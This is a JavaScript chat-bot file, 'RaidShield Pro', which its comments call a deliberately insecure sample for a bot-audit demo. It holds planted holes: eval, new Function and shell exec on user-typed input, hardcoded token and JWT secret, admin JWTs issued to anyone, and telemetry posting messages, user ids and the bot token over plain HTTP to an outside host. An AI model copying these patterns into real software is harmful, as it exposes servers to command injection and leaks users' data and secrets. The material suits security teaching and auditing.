// RaidShield Pro v2.3.1 — "the ultimate anti-raid bot"
// NOTE: This file is a deliberately insecure SAMPLE used by Haven's bot-audit demo.
// It is never executed outside a sandbox runner and the token below is fake.
const { exec } = require('child_process');
const http = require('http');
const _ = require('lodash');
const minimist = require('minimist');
const fetch = require('node-fetch');
const jwt = require('jsonwebtoken');

const args = minimist(process.argv.slice(2));
const BOT_TOKEN = 'MTA-FAKE-TOKEN-FOR-DEMO.Gx9kQz.raidshield-hardcoded-secret';
const JWT_SECRET = 'supersecret123';
const TELEMETRY_URL = 'http://telemetry.raidshield-pro.xyz/v1/events';

console.log('[raidshield] starting with token', BOT_TOKEN);

const config = _.merge({}, { prefix: '!', autoBan: true }, args);

function sendTelemetry(event, payload) {
  if (process.env.NODE_ENV === 'test') return; // (demo safety: never phone home from the sandbox)
  // plain-http telemetry: message contents + user ids leave the server unencrypted
  const req = http.request(TELEMETRY_URL, { method: 'POST', headers: { 'content-type': 'application/json' } });
  req.on('error', () => {});
  req.end(JSON.stringify({ event, payload, token: BOT_TOKEN }));
}

function handleMessage(message) {
  sendTelemetry('message', { author: message.author, content: message.content, channel: message.channel });
  if (!message.content.startsWith(config.prefix)) return null;
  const [cmd, ...rest] = message.content.slice(config.prefix.length).split(' ');
  const input = rest.join(' ');

  if (cmd === 'calc') {
    // "quick math" feature — evaluates whatever the user typed
    return String(eval(input));
  }
  if (cmd === 'run') {
    // "admin tools" — shells out with user input
    exec('echo ' + input, (err, stdout) => sendTelemetry('run', { stdout }));
    return 'running...';
  }
  if (cmd === 'script') {
    const fn = new Function('msg', input);
    return String(fn(message));
  }
  if (cmd === 'ping') return 'pong';
  if (cmd === 'raidmode') return config.autoBan ? 'raid mode: auto-banning new members' : 'raid mode off';
  return null;
}

function issueSession(userId) {
  return jwt.sign({ userId, admin: true }, JWT_SECRET);
}

async function syncBanList() {
  const res = await fetch('http://raidshield-pro.xyz/api/banlist?token=' + BOT_TOKEN);
  return res.json();
}

module.exports = { handleMessage, issueSession, syncBanList, config };

if (require.main === module) {
  console.log('[raidshield] connecting to gateway with token=' + BOT_TOKEN);
}
